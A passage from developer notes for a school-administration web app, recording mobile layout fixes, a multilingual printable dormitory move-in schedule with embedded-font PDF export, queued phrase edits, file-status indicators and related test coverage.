  through to the global `th, td { text-align: left }`.
- `.claude/skills/run-local/driver.mjs` now stubs `getAllTeachersSchedule`
  with four teachers and every slot state, on **computed** dates — a hardcoded week
  renders an empty grid on every day but the one it was written.

`tests/mobile.test.js` §18 covers all of the above; all 16 mutations of it were
checked to fail.

⚠️ **面接結果 narrows; プレースメントテスト scrolls. The asymmetry is the point.**
Both are wide data tables, and the difference is whether the row has somewhere to
hide the rest of itself.
- **面接結果** shows 日付 / 名前 / 合否 on a phone; `renderPastInterviewsTable` tags
  every other cell `.ir-sec` and one media-block rule hides it. Safe **only** because
  each row already carries `onclick="showDetail(…, 'interview')"` and `showDetail`
  iterates the whole header array into `#detailCard` — verified live: 20 fields, tap
  a row and 国籍 is there. If that row handler ever goes, `.ir-sec` goes with it; §19
  asserts the pairing rather than assuming it.
- ⚠️ **Matched by header NAME through `normName`, never by index.** These headers are
  row 0 of `Interview_Results`, sent verbatim, so an `nth-child` rule follows the
  wrong column the first time someone reorders the sheet — the positional half of
  this file's oldest bug class. If nothing matches `IR_PRIMARY` it **fails open** and
  hides nothing: a blank table is far worse than a wide one.
- Verified, because both surprised me: search still matches hidden columns
  (`filterInterviewsTable` reads `textContent`), and CSV/Excel/PDF still export all
  20 (`_expReadTable`'s `innerText` falls back to `textContent` on an unrendered
  cell). **Sorting does narrow** — a hidden `<th>` cannot be tapped, so a phone sorts
  only by the three visible columns. Deliberate.
- ⚠️ **プレースメントテスト's results table gets NO mobile treatment, deliberately.**
  Three were built and all three were reverted, so don't re-propose one without that
  history being the point:
  1. the generic rules alone — ten columns compressed into 390px, 「タイムスタンプ」
     wrapping to about one character per line;
  2. a `min-width: 760px` floor so it scrolled sideways with the first column frozen —
     which read fine in a screenshot and was unreadable in use, because tying a score
     to a name meant swiping back and forth;
  3. a per-row **card** layout (`data-label` on each `<td>` + `content: attr()`) —
     readable, and still not what was wanted.

  It now renders from its desktop rule (`Index.html:~409`, `max-width: 280px` +
  `word-break: break-word`) at every width, and `tests/mobile.test.js` §19 asserts
  that `#placementResultsTableEl` appears **nowhere** in the media block — the
  decision written down, so a treatment cannot drift back in without deleting it.
  ⚠️ Only the *table* was reverted: the sub-tab's icon buttons and the `#placementLinkField`
  sizing stay, and §19 asserts those survive too, because the delete sat directly on
  top of them.

  Two lessons outlived all three attempts, and they are about the file, not the table:
  - ⚠️ **Don't re-declare `.student-table`'s frozen first column under an `#id`
    selector.** It outranks the class, and lowering the header's `z-index` from 4 to 3
    tied it with the other headers so the next one painted over the pinned 氏名 —
    frozen in the body, loose in the header.
  - ⚠️ **Measure paint order; don't squint at a screenshot.** That bug was invisible
    at phone scale and `document.elementFromPoint` is what settled it. The same goes
    for anything positioned: the 出力 menu below was diagnosed the same way.

⚠️ **The 出力 popover assumes it sits at the right of its row.** `.exp-menu` is
`right: 0` with a 220px `min-width`. On a phone `#searchInterviewsInp` takes a full
row, so 出力 becomes the *leftmost* item of the second row and the menu opened at
x = −178…56 — 178px off the left edge, unreachable. Nothing clipped it, and content
off the **left** does not extend `scrollWidth`, so `driver.mjs overflow` reported
nothing. Re-anchored with `left: 0; right: auto`, ⚠️ **scoped to
`#sub-view-past-interviews`**: four other `.exp-wrap` copies exist and the 在籍学生
one is pinned hard right by `justify-self: end`, so an unscoped flip would throw that
one off the far side instead. The 増減推移 modal is the second such scope; 進路 and
学生数レポート are right-pinned and must **never** be added. `tests/mobile.test.js`
§19 enumerates the allowed scopes and rejects an unscoped rule outright.

⚠️ **A MODAL NEEDS ITS OWN CSS SCOPE — every clip rule here is view-scoped.**
`#stuTrendModal` (増減推移) is a body-level **sibling** of `#view-students`, not a
descendant, and a descendant combinator cannot cross into a sibling subtree. So
`#view-students .btn-label` never reached it, which is why that modal still had text
buttons long after 学生一覧 went icon-only. The trap: the `.btn-ico` reveal **is**
global, so adding an SVG without a matching clip rule renders icon *plus* text — a
**wider** button than before. Both halves must land together. Every other modal in
the file has the same blind spot; only this one had buttons worth the trouble.
- ⚠️ Its sizing rule is the only one covering **`.btn-cancel`** (− 前年度 is one).
  閉じる is `.btn-cancel` too but carries **no `.btn-label`**, so `:has()` skips it and
  it keeps its word. That absence is load-bearing — give 閉じる a label span and it
  silently becomes an anonymous square.
- ⚠️ **A popover inside a modal breaks on TWO axes, and only measuring shows the
  second.** `.modal-box` is `overflow: auto` + `max-height: 92vh` on mobile, so it
  **clips** an absolutely-positioned child. The button sits in the action row at the
  bottom, and `top: 100%` opened the menu straight out of the box: two of its three
  items hit-tested to the overlay rather than to themselves. It opens upward
  (`bottom: 100%; top: auto`) at **every** width — not as a mobile override, which is
  what it was until the buttons moved and the override became wrong.
- ⚠️ **`.exp-menu` is anchored to the ACTION ROW here, not to the button.**
  `#stuTrendActions` is `position: relative` and `#stuTrendModal .exp-wrap` is
  `position: static`. `.exp-menu` is `right: 0` + 220px `min-width`, which assumes the
  button is the last item in its row; 出力 is second from the right. Anchoring to the
  button left 17px off a phone and put the whole menu outside `.modal-box` on desktop.
  Anchoring to the row pins it to the modal's own right edge whatever the buttons do —
  including when 保存 is hidden for non-editors, which shifts 出力 sideways. Verified:
  identical rect with 保存 shown and hidden.
- ⚠️ **The action row is NOT `class="modal-actions"`, deliberately.** 18 modals use it
  and its desktop rule (`justify-content: flex-end`) is exactly what this row wants —
  but its mobile rule is `flex-direction: column !important` + `> button {width:100%}`,
  which stacks these into full-width bars and undoes the icon-only treatment.
- ⚠️ **And flattening the row into one div made it a direct child of `.modal-box`,
  which the FORM-row stacker then caught.** `.modal-box > div[style*="display:flex"]`
  sets `flex-direction: column !important` for side-by-side *fields*, and its own
  comment warns that a blanket rule "would also flatten toolbars and chip rows, which
  are meant to stay horizontal" — this row is exactly that case. `#stuTrendActions`
  restates `flex-direction: row !important` to opt out. Desktop looked perfect the
  whole time; only the phone measurement showed it.

⚠️ **An action column is skipped in exports by marker class (`.exp-skip`), never by
index.** `_expReadTable` used `cells.slice(1)` driven by an unconditional per-table
flag — but 面接結果 only renders that column `if (canEdit)`, so anyone **without**
`entry_interview_results` silently exported every file with `Timestamp` missing.
Moving the column to the right and slicing the far end would only have relocated the
bug onto `EnteredBy`. Reading the cell's own class is true at either end, and whether
or not the column exists.

⚠️ **A button that carries an icon may never be written with `innerText`** — it
replaces every child, so the SVG goes with it and the button renders blank on a
phone. Use `_setBtnLabel` / `_getBtnLabel`; the **getter** matters just as much,
because the usual shape is save-swap-restore (「取込中...」「コピーしました」「保存中...」).
`tests/mobile.test.js` §19 derives the icon-bearing ids **from the markup** and
resolves each `getElementById` alias before looking for writes to it — a plain window
scan reports `helpEl`'s `innerText` in `calRenderGrid` and is useless. Written that
way it found two **pre-existing** instances that had nothing to do with 入試関連:
`#btnSimSave` (募集シミュレーション 保存) and `#btnAutoFill` (寮管理 自動割当), both
blanking themselves on a phone since their icons were added. Both fixed.

Desktop is pixel-identical across all three sub-tabs — proved by diffing
`driver.mjs shot --vp desktop` before and after, not by reading the CSS.

⚠️ **募集状況's キャンセル is THREE tables, one per 種別 — it used to be one table with
three colspan bands.** The bands were padded to a common row count (`maxRows`) and
divided by a border constant, and the file warned that the column count "appears in
five coupled places". Three independent tables need none of that. They sit side by
side on desktop (`.rec-cancel-set` / `.rec-cancel-group`) and stack below 820px.
⚠️ Order is `REC_CANCEL_KINDS` and must stay 申請キャンセル → 申請取り下げ →
COE後キャンセル. ⚠️ `#recCancelTable` must remain the common ancestor of every
`[data-row]` control — `_recRowOpSel` builds every queued キャンセル op's selector as
`#recCancelTable [data-row="…"][data-field="…"]`, which is how the 保存 queue finds a
cell again after a re-render. (It was `_recConfirmPendingRow` that needed this until
deferred adds removed it — same rule, different owner.)

⚠️ **But the table was not what made the page slide. The flex item was.**
`.table-responsive` can only scroll if something clamps it, and its column is inline
`flex: 0 0 auto` — flex-shrink 0, sized to max-content — so it never got clamped and
the whole page overflowed instead: measured `scrollWidth` **1310** against a 390px
viewport. The mobile sweep that zeroes inline `min-width` matches the ビザ以外 column's
`min-width:420px` but **cannot see `flex: 0 0 auto`**, which is why that one column
behaved and the other two did not. `.rec-bottom-col { min-width: 0 !important }` plus
stretch is the fix.

⚠️ **`flex-wrap: wrap` + `flex-direction: column` sizes items against their LINE, not
the container** — and this one cost three measurement rounds. Both the outer row and
the 種別 set carry `flex-wrap: wrap` for their desktop layout. Flipping to `column` on
mobile makes the container form cross-axis *lines*, so `align-items: stretch` stretches
each item to its line's widest member — 766px of max-content table — rather than to the
366px container. `flex-wrap: nowrap` on both is the load-bearing half. Measured
1310 → 778 → 433 → **390** as each was found; every step looked plausible and only the
number said otherwise.
- `.claude/skills/run-local/driver.mjs` now carries a `getRecruitmentBundle`
  fixture. Without it 募集状況 renders 「入学期を選択してください。」 and none of this is
  visible locally. ⚠️ Its `resolvedIntake` must match an entry in `data.intakes`, or
  `recLoad` bounces between its two branches; and the cancel counts are deliberately
  **uneven** across the three 種別, because evening them out is exactly what the
  deleted `maxRows` padding did.

### 入寮時渡すスケジュール (寮管理 → 入寮時渡すスケジュール)

A one-page printable handed to an accepted student: which day, which campus, what
time, what to bring. Built one student at a time, from day blocks of phrases.

⚠️ **Students do not exist in `Central_DB` yet when this is printed** — they are added
roughly after the entrance ceremony. `Interview_Results` is the only place they exist
at that point, so `getScheduleApplicants` reads name + 国籍 from there for the
type-ahead. 国籍 preselects the second language. Suggestions are a convenience only;
the name stays free text, because a passport name (`SAMPLE RIVERA ALEX MORGAN`)
routinely differs from the interview record.

⚠️ **A late arrival is handled by DELETING day blocks**, not by a rule. That is what
the second reference sheet is: the student lands just before the ceremony, so the
paperwork days simply are not on their copy. No arrival-date logic, deliberately — the
app should not be deciding which paperwork a student missed.

#### 日程の種別 — pick the day, not each line

Staff think in days (手続き / 口座開設 / 入学式), and each carries the same handful of
lines. `Schedule_DayTypes` holds them as a **flat ordered comma-separated key list** —
not JSON, because the order is the whole meaning and flat stays hand-editable.

⚠️ **Choosing a 種別 MATERIALISES its phrases into the block; the block keeps no live
reference.** A reference would mean editing 入学式 in 文言管理 silently rewrote every
saved template that used it, including ones already printed and handed to a student.
Materialising is also what lets each line keep its ✕.

⚠️ **A key whose phrase has been deleted is SKIPPED, never materialised blank.** An
empty bullet on a student's sheet is worse than a short list. 文言管理 warns which
種別 reference a phrase before you delete it.

⚠️ **Appending a single phrase had to stay**, even though building a block one phrase
at a time is exactly what the 種別 select replaced. Schedule_2 is 入学式 *plus* the
passport line and lunch — without the append control those extra lines could only be
自由入力, i.e. untranslated, which defeats the phrase library in the one case that
motivated the design. It is kept visually secondary; 種別 is the way in.

⚠️ **Each line has its own time box, printed BEFORE the text.** Both references put
times on individual lines (`10:30~ Japanese interview`, `9:45~11:30 Entrance
Ceremony`); without this those lines could only be free text. The references are
inconsistent about placement — Schedule_1 also has `Entrance Ceremony 9:30~` — so
time-first is a deliberate standardisation. An absent time must add **no leading
space**: every line saved before this change has none and must render identically.

⚠️ 持ち物 phrases default to the bracketed 補足 style, which matches two of the three
持ち物 lines in the references (the passport line uses a bullet). The 補足 checkbox
flips it per line.

#### The two rules that must not be weakened

⚠️ **日本語 is the constant half of every line; the second language is chosen per
student.** English is just one of the choices (and is what both reference sheets
happened to use). A phrase with no Japanese is incomplete, not translatable.

⚠️ **An empty cell and a seeded `【要翻訳】` placeholder MUST behave identically —
both print Japanese alone.** The library ships seeded so the feature works before the
translations arrive, which means the placeholder is one weakened condition away from
printing on a student's schedule. `schedNative` returns `""` for both;
`tests/schedule.test.js` §2 asserts they are indistinguishable, and the source-binding
regex there is what catches a mutation of the condition itself.

#### Why it prints through the browser, not `getAs(MimeType.PDF)`

⚠️ **The app's server-side PDF path cannot render these languages.**
`Utilities.newBlob(...).getAs(MimeType.PDF)` renders on Google's servers with no
webfonts — `Shinsei_Template.html`'s Noto import is silently ignored there. Japanese
survives on a generic CJK fallback; **Devanagari, Burmese and Sinhala do not.** So
this uses the `_expPdf` print-window shape, where the browser has the fonts. Verified
by eye: Nepali and Burmese both render correctly in the preview.

⚠️ **The font stylesheet is injected by script, never a `<link>` in `<head>`.** A
stylesheet link is render-blocking: with `fonts.googleapis.com` slow or filtered — a
school network may well do that — the whole page stayed **blank** rather than
degrading. Measured: the preview iframe painted nothing while `readyState` sat at
`"interactive"`. Injected, the text paints immediately in a fallback face and upgrades
when Noto arrives.

⚠️ **Printing waits on `document.fonts.ready`, not the 400ms timer the other print
windows use.** Those print Latin and kana, where a fallback is merely uglier; here
printing before Noto lands is the tofu this whole design exists to avoid. Capped at
4s so a blocked CDN still prints, degraded, rather than hanging.

#### The download button is the one server-rendered path

印刷 opens the browser print window (above). **PDFをダウンロード** is the opposite: the
client sends the HTML `schedBuildHtml()` already built, and `downloadSchedulePdf`
converts it with `getAs(MimeType.PDF)` — the path the section above says cannot render
these scripts. It works only because the missing font is **embedded as a `data:` URI**,
which the converter can use without making any request of its own.

⚠️ **Only the script the chosen language needs, and 日本語 is deliberately excluded.**
`SCHED_PDF_FONTS` maps ネパール語 → Devanagari, ミャンマー語 → Myanmar, シンハラ語 → Sinhala;
every other language embeds **nothing and fetches nothing**, because Latin and CJK
already survive the server's own fallback. Noto Sans JP is ~5MB — it would cost the
most and buy the least.

⚠️ **TTF, via the v1 `css?family=` endpoint — not `css2`.** The converter is old enough
that woff2 is not worth risking, and v1 serves TTF to an unknown User-Agent. The
`.ttf` assertion is load-bearing: silently embedding a format the converter drops
produces exactly the box-filled page this route exists to avoid.

⚠️ **A font that cannot be fetched THROWS.** Degrading to a PDF of empty boxes handed
to a student is the one outcome worth failing the whole export over. The message is
actionable, so it carries an instruction and no `AREA-NN` code.

⚠️ **The HTML is NOT rebuilt server-side.** A second copy of `schedBuildHtml` in
`Code.js` would drift from the preview on the first layout change — the `_calCellState`
lesson. `combineRoomHtmlToPdf` is the existing precedent for taking client HTML.

✅ **VERIFIED on a Burmese export (staging v160).** `pdffonts` reported
`NotoSansMyanmar-Regular — CID TrueType, Identity-H, emb: yes`, and the rendered page
shows correctly stacked Burmese, not tofu. So `getAs(MimeType.PDF)` **does** honour
`@font-face` with a `data:` URI even though it ignores an `@import` — the difference is
that a data URI needs no outbound request, which is the whole reason this works.

⚠️ **Do not read "it was fast" as "the font was skipped".** The Burmese export took
about as long as an English one, which looked like the fetch had been bypassed. It had
not: the converter **subsets** the embedded font to the glyphs actually used, so a
Burmese page adds ~30KB rather than the ~300KB of the source TTF. Check `pdffonts`, not
the clock or the file size.

⚠️ **`background` (shorthand) is DROPPED by the converter; `background-color` survives.**
The yellow date bar was on the printed copy and missing from the downloaded PDF — the
one mismatch that matters here, since the two go out together. Browsers treat the two
declarations identically, so the longhand costs nothing. Assume any other shorthand is
suspect on this path.

The Type 3 `NotoSansJP-Thin` subsets `pdffonts` reports for the Japanese are **not** a
problem — that is just how the converter names its own CJK fallback subsets, and the
weights render correctly.

#### 入学期 was removed from this tab, deliberately

It filtered the name type-ahead and was written to `Schedule_Templates`' 入学期 column.
⚠️ **Nothing ever read that column back** (templates are listed and loaded by name),
and ⚠️ **the dropdown was usually empty** — it was filled from `window._recExtraIntakes`,
which only `recLoad` in 募集状況 populates, so a session that had not visited that tab
saw 「（すべて）」 and nothing else. The field is still written as `""` so the sheet keeps
its column shape. Suggestions now span all of 面接結果; if that ever gets unwieldy the
fix is a limit, not the return of the select.

#### キャンパス is a phrase, not a fourth sheet

The venue on a day block is a dropdown, and its options are phrases with
`分類 = キャンパス` — so a campus gets an English and a native form like every other
phrase, with no new sheet and no new admin screen.

⚠️ **Two filters, and BOTH are required.** Overloading the library on `分類` means the
category now decides where a phrase may appear: `schedCampusPhrases()` feeds the place
select, `schedLinePhrases()` feeds the block's `＋ 文言を追加` picker **and** the 種別
editor's append picker. One filter without the other and a campus prints as a bullet on
a student's sheet. A third phrase picker would need the same treatment;
`tests/schedule.test.js` §8 asserts both directions.

⚠️ **A `<select>` whose value is absent from its options silently falls back to the
first option WITHOUT firing `change`.** Templates saved before the dropdown store
`place` as free text (`"@Main Campus"`), so the screen would have shown one campus
while the blob kept another. `schedPlaceSelect` carries an unrecognised stored value as
its own option, flagged red — the same shape `recRenderCancelTable`'s `sel()` uses in
募集状況. A legacy place still prints byte-identically to before, on both lines.

⚠️ **The `@` belongs to the renderer, and to the English header only.** `@Main Campus`
matches both reference sheets; `4月2日 9:00am 本校キャンパス` reads wrong with one. A campus
with no English falls back to Japanese through the same `schedNative` path as every
other line — the `@` survives that fallback.

⚠️ **The block's 種別 select is restored by writing `selected=`, not by position.** It
used to be fixed up afterwards as "the first `<select>` in the block"; the place select
is now that. The positional pass is gone rather than renumbered.

⚠️ **文言管理 could only ever write `分類 = ""`.** The seed runs only when the sheet is
*created*, so in any project already using the feature — staging and production both —
there was no way to add a campus at all, and nothing on screen said why. 分類 is now a
column in the phrase table and a prompt on add. It is a `<select>`, not a text box:
「キャンパス 」 with a trailing space is this file's oldest bug class and would drop the
row out of the campus list while looking correct.

⚠️ **Reordering a line must not clear `b.dayType`.** Lines carry ↑↓ (`schedMoveItem`)
because for some students オリエンテーション runs before 入学式. Clearing the type would send
the select back to （種別を選択）, and re-picking there re-materialises the lines and
throws the reordering away.

#### 部屋 comes from 寮管理's own lists — no new endpoint, no new sheet

建物 and 部屋 are two **type-and-search** boxes in the header row, and the printed sheet
carries `中央寮 201号室 / Central Dorm Room 201` under the name.

⚠️ **Nothing is fetched for them.** This sub-view lives under 寮管理, whose tab button is
gated on `view_dorms`, so `getDormData` has already run for anyone who can reach the
screen — `initDormGrid` parks its result in `window._dormBuildings` and `currentDormData`.
Adding an endpoint here would be a second reading of data already on the client.

⚠️ **A `<datalist>` is a suggestion list, NEVER a constraint** — the browser accepts any
text typed into the input. So the "no room that does not exist reaches a student" guarantee
is held by **resolution**, not by the widget: `schedRoomLines` returns empty unless *both*
halves resolve, so a half-typed or mistyped box prints nothing rather than something
plausible. That property is the load-bearing one; `tests/schedule.test.js` §10 pins it in
five directions. They started as `<select>`s and were made typeable because scrolling a
real building list to find one is slow.

⚠️ **Building labels are unique BY CONSTRUCTION.** `schedBuildingOptions` counts display
names first, and when two buildings claim the same one **both** become `名前 (id)`. That is
what makes an exact-match lookup safe — the alternative is resolving to whichever building
came first, which is this file's oldest bug class and would show the wrong rooms. ⚠️ The
`(id)` is an affordance for the search box only: `schedRoomLines` prints
`b.nameJp || b.nameEn || b.id`, never the label.
- ⚠️ **Exact match, never a prefix.** 「西」 is an unfinished name, not a choice.
- ⚠️ `schedAutoFillRoom` writes the **label**, not the raw id — writing `B012` would leave
  the box unresolvable and print nothing.

⚠️ **The occupancy hint lives in the option's `label` ATTRIBUTE, and the value is the bare
room number.** In a `<datalist>` the *value* is what gets typed into the box, so
`value="201（空室）"` would put that on a student's sheet. (As a `<select>` the same trap
ran the other way — the status was safe in the label and lethal in the value. It survives
the rewrite because it is really a rule about which half travels.) The hint itself reuses
`initDormGrid`'s rule — `!(status === "空室" || studentName.trim() === "")` — so the two
screens cannot disagree about what 入居中 means. ⚠️ That rule calls a room marked 入居中
with **no tenant** vacant, which is the state the nightly sync leaves behind.
⚠️ Chrome renders value + label, Firefox renders the label; both insert the value.

⚠️ **The red flag fires on `change` only, never on `input`.** `schedFlagBox` paints
`color:#e74a3b` — the idiom `schedPlaceSelect` and `recRenderCancelTable`'s `sel()` already
use — on a committed box that is non-empty and does not resolve. Flagging from `oninput`
paints the box red on every keystroke of a name that is merely unfinished. Committing the
**building** re-judges the room too, since a room's validity depends on it.
⚠️ Changing the building rebuilds the room suggestions but does **not** clear the room text:
clearing on every commit would delete a room number because somebody tabbed through.

⚠️ **`schedFillRooms` has TWO callers, because the two loads race.**
`switchMainTab('dorms')` fires `getDormData` and `switchDormSubTab('entry-schedule')` fires
`schedLoad`, and neither waits for the other. `schedLoad`'s success handler and
`initDormGrid`'s tail both call it. Drop either and opening the sub-tab quickly leaves the
suggestions empty with nothing on screen saying why.

⚠️ **The two boxes are ONE flex item with `flex-wrap: nowrap`.** They are a single piece of
information — an address — and the outer row's `flex-wrap: wrap` split them across two
lines at narrow widths. ⚠️ `min-width: 0` on both halves is load-bearing: a flex item
defaults to `min-width: auto`, i.e. its content width, so a long building name pushed the
pair wider than the form instead of truncating inside it (the `.rec-bottom-col` lesson).
Measured: same `y`, inside the viewport, at 390px and 1440px.

⚠️ **日本語 + English only — the one line on the sheet where the second language is not the
student's own.** A building carries `nameJp` and `nameEn` and nothing else; a dorm name is a
proper noun with no Nepali form. The English half is dropped when the building has no
English name of its own, because 「北寮 A1号室 / 北寮 Room A1」 reads worse than one line.

⚠️ **The `.sched-hdr` wrapper is emitted ONLY when there is a room**, so a sheet with the
field empty — or unresolved — produces byte-identical markup to before this existed. Its
rules use `margin` **longhands** (the converter drops shorthands on the download path), but
`.sched-name`'s own `margin: 0 0 24px` was deliberately **left alone**: converting it would
move the spacing on every sheet already going out.

⚠️ **Auto-fill from 部屋一覧 refuses to guess.** Picking a name fills the room when exactly
one tenant matches through `normName` — **two matches fill nothing**, since guessing puts a
student in somebody else's room. It never overwrites a room already chosen, because it runs
from `oninput`. ⚠️ It will usually find nothing, by design: these students reach 学生一覧
after the entrance ceremony, so a quiet miss is the normal case and must not look like a
failure.

⚠️ **`xss.test.js` does NOT cover the building suggestion, and cannot.** Its §3 regex
(`(["'])[^"']*<[^"']*\1\s*\+`) can't see a string literal containing the *other* quote
character — which is how every attribute in this file is built — so **162 concatenation
sites are invisible to it**, this one included. §10 asserts the `escAttrJs` directly. The
sampled invisible sites are all genuinely safe today; the gap is that the next unescaped one
of this shape will not be caught.

**The room is per-student, so it is NOT saved in the template** — same as 名前 and 言語.
`Schedule_Templates` still carries `{v:1, blocks}` and `v` did not move.

#### 寮管理's palette: tonal + one primary (retouched 2026-09-11)

The same rule as 募集状況 and every phone layout: tonal secondaries, **one** solid primary per
area, and 削除 as a red **outline**. The primaries are ＋部屋登録, 追加, テンプレート保存 and 印刷.
Before, it had five accents, all from inline `background-color` (yellow, teal, green and solid
red); an inline colour beats any stylesheet rule, so they had to come out of the markup.
`tests/dormui.test.js` pins it, and each guard is run against the old markup.
- ⚠️ **Styled BY ID, never by adding a class.** `dormsync` / `mobile` / `buildingcolumns` pin
  `class="export-btn permission-req" data-perm=… data-orig-display=…` byte for byte, and
  `setupInterfaceBasedOnRole` drives visibility from exactly those attributes. The one CSS comment
  describing this had to avoid quoting `id="…"`: `domrefs` reads any `id="x"` in the file as an
  element and failed with 「btnAutoFill ×2」.
- **Tonal buttons FILL with the primary on hover** (white text). The shared `brightness(0.9)`
  hover was invisible: a light tint on the building header's own light background, reported on
  the building rows. The primaries keep their darken, and 削除 keeps its red; their id selectors
  outrank the class rule. Measured with the driver's new **`--hover <selector>`**, which moves the
  real mouse, because `page.evaluate` cannot fake `:hover`.
- ⚠️ **`.export-btn` had no `:disabled` style.** 別紙一覧's 名前変更 / 削除 start disabled until a
  file is chosen, and they looked fully clickable. They now show at 0.45 opacity.
- ⚠️ **`.filter-group` / `.filter-label` are styled ONLY inside `.student-filter-bar`.** Anywhere
  else the label falls wherever it wraps: in the スケジュール form, beside 敬称 and 言語 but above
  名前. The fix is scoped to `#schedForm .filter-group:has(> .filter-label)`. The direct-child
  `:has` is what leaves the 建物・部屋 pair alone: it is ONE row on purpose, with its labels one
  level deeper, and a plain column rule would stack 建物 over 部屋.
- The 11 ↑↓✕ controls (day blocks, lines, 文言管理) are `<button class="sx-btn">` now, with the
  `onclick` text byte-identical. They were `<span onclick>`, with no keyboard path.
- A pixel diff flagged アカウント設定 as changed; it had not been touched. Same-session shots of
  HEAD and the working tree were identical: the baseline had caught Noto Sans JP loaded and a
  later run had not. **Compare against a same-session HEAD render before believing a diff in a tab
  you did not touch** — the lesson the ユーザー list baseline taught once already.

#### 文言管理 queues its edits — nothing is sent until 保存

⚠️ **An `onchange` handler that re-renders is a typing bug, and it does not look like
one.** Every cell used to call `saveSchedulePhrase`, whose success handler ran
`schedRenderPhrases()` — `host.innerHTML = h`, rebuilding every `<input>`. It is not a
per-keystroke handler, so the source reads as harmless; the damage is that the rebuild
lands **asynchronously**, a round trip later, by which time the user has tabbed on and is
typing into a field that then vanishes. Reported as "hard to type in information".
Fixed 2026-09-08: handlers touch the model, paint the cell amber, bump a badge, and send
nothing. `tests/schedule.test.js` §11 asserts the handlers contain **no `apiRun` and no
`schedRender`** — that absence is the fix.

- Reuses 募集状況's queue idiom rather than copying it: **`_recMarkPendingCell`** is called
  from 文言管理 too. A second copy of the marker is the `_calCellState` mistake.
- ⚠️ **Markers must be re-applied after EVERY render** (`schedPaintDirty`). Adding a
  phrase re-renders; without it the amber vanishes from every other queued cell and the
  user believes those saved.
- ⚠️ **種別 are marked on the OBJECT (`_dirty`), never keyed by index or name.** Indices
  shift the moment one is deleted, and the name is an editable field.
- ⚠️ **A deleted row stays on screen, struck through, until 保存** — that is what makes
  closing without saving undo everything.
- ⚠️ **`schedAddLanguage` refuses while dirty.** It adds a *column* and reloads the whole
  library, which would discard the queue silently.
- ⚠️ **`closeSchedPhrases` is in `modalClosers`.** Esc closes modals since v173, so
  without that entry one keypress discards the queue with no warning.

⚠️ **`saveScheduleDayType` located its row by NAME, and 種別名 is editable** — so renaming
手続き found no row and **appended a second one**, leaving the original behind. The screen
hid it (the client array holds one) until the next load. `saveSchedulePhrasesBatch` takes
`origName`, captured **at load** (`d._orig = d.name`) before anyone can edit it; capturing
it at render time would capture the edited name and reintroduce the append.
✅ Phrase keys are safe — that cell is plain text, not an input.

`saveSchedulePhrasesBatch` reads each sheet once for a whole session; the per-row endpoints
it replaced each read the ENTIRE sheet to write one row. ⚠️ **Those four (`saveSchedulePhrase`,
`deleteSchedulePhrase`, `saveScheduleDayType`, `deleteScheduleDayType`) were DELETED 2026-09-21**:
nothing called them, yet they stayed in `_apiMethods_()` — reachable by any session, the
rename-appends-a-row bug included. `tests/schedule.test.js` §7 pins them absent from the source
and the registry, so they cannot drift back in. ⚠️ Deletes are applied **before** upserts (a
row deleted and re-added in one session must end as an add), and the row data is re-read
afterwards because `deleteRow` shifts every row number below it.

#### Wiring traps

- ⚠️ **寮管理 uses a THIRD sub-view scheme.** 学生一覧 and 入試関連 use
  `.sub-view-section` + an `active` class; 寮管理 uses a bare `.dorm-sub-section`
  marker with inline `style.display` and no CSS rule at all. The two are not
  interchangeable — an `.active`-styled sub-view dropped in here never shows.
- ⚠️ **`switchDormSubTab` now sweeps by class.** It used to name its two sub-views
  and two buttons a line each, so adding a third would have left the previous one
  visible underneath — the same trap `switchAdmissionsSubTab` still has. Ids follow
  `dorm-sub-<key>` / `btn-dorm-<key>`, so a fourth sub-view needs no edit there.
  ⚠️ Rewriting it means 部屋一覧 and 別紙一覧 depend on it too: all three were
  re-checked to show exclusively.
- Two sheets are created on first use (`Schedule_Phrases`, `Schedule_Templates`), and
  the phrase library is seeded on creation. ⚠️ **Created in production ≠ created in
  staging** — each project seeds its own, and sheets do not survive File → Make a copy.
- `内容` in `Schedule_Templates` is a **JSON blob**, deliberately: the content is
  nested (day blocks holding items), and the alternative is `Shinsei_Data`'s 46
  anonymous positional columns. It carries a `v` field so the shape can move.
- Language columns are located **by header name**. Adding a language IS adding a
  column; a row that predates it simply has no value, which reads as untranslated.

### File selectors show what is already stored (2026-09-29)

Every file input sits in a `.file-box` with a status strip. Dashed means nothing is stored. Solid
green 「✓ 登録済み」 means a file is stored (with 見る where it can be opened). Amber
「↻ 置き換え: name」 / 「＋ 追加: name」 means a new file is chosen, with 取消. Asked for as "a
universal strong indicator": the booking modal's link under the box was the only one, and building
photos showed nothing. `tests/filebox.test.js`, mutation-checked.
- ⚠️ **A browser never pre-fills a file input**, so the stored state cannot come from the input.
  Whoever loads the record calls `fileBoxSet(input, stored, onView)`. A new loader that skips it
  shows 未登録 over a file that is really there; §3 pins every current call site.
- ⚠️ **`fileBoxPaint` is the only renderer, and the file name goes in by `textContent`.** It is a
  name from the user's own disk. One delegated `change` listener repaints any box, so a new input
  needs only the wrapper, and §3 derives "every file input is wrapped" from the markup.
- ⚠️ **Setting `input.value = ""` from script fires no `change`.** Anything that clears an input
  must repaint (`hidePhotoSlot`, the 別紙 opener).
- The border is 2px in every state, so a state change never moves the layout.
- **The stored file's NAME comes from Drive**, because the sheets hold ids only.
  `getStoredFileNames(role, perms, kind, refs)` returns names, never bytes.
  - ⚠️ **It has the same guard and the same membership rule as `getUploadedFile`**, because it
    too reads as the deployer. `kind` (`hearing` / `photo`) only picks which allow-list is read.
    `_buildingPhotoFileIds_` is its own list and is deliberately not one of `getUploadedFile`'s,
    since that endpoint serves bytes. §4 binds the two guards to each other.
  - The client batches every lookup from one modal open into one call per kind, and caches
    names for the session. 「✓ 登録済み」 paints at once, and the name fills in when it arrives.
  - ⚠️ **Photos uploaded before 2026-09-29 have no name to show.** They were saved as
    `B012_WM_1.jpg` and the uploaded name was discarded. They are now saved as
    `<bldgId>_<slot>_<uploaded name>`. Hearing sheets were always `<teacherId>_<date>_<name>`.
    `_storedFileLabel_` strips the prefix **by kind**, never by the name's shape.
- Two data bugs were found while wiring it, both fixed:
  - **Re-saving a booking blanked its ヒアリングシート.** `confirmBooking` read the stored URL from
    the anchor's `href`, which `801f363` removed. It now reads `_bookingStoredDoc`.
  - **＋建物追加 after 編集 kept the last building's 外観写真**, because `form.reset()` does not
    clear a script-set hidden input.
- ⚠️ **Bookings re-saved in production before this fix lost their document link.** The Drive files
  still exist in the uploads folder; only Schedule_DB's cell was blanked.

### Esc closes the top-most dismissible thing

⚠️ **A predicate that is always FALSE does not throw — it makes a feature not exist.**
The global Esc handler was written, shipped, and never worked once. Its filter read
`m.offsetParent !== null`, and **`offsetParent` is always `null` for a `position: fixed`
element** — which every `.modal-overlay` is. Measured with 増減推移 open: 26 overlays,
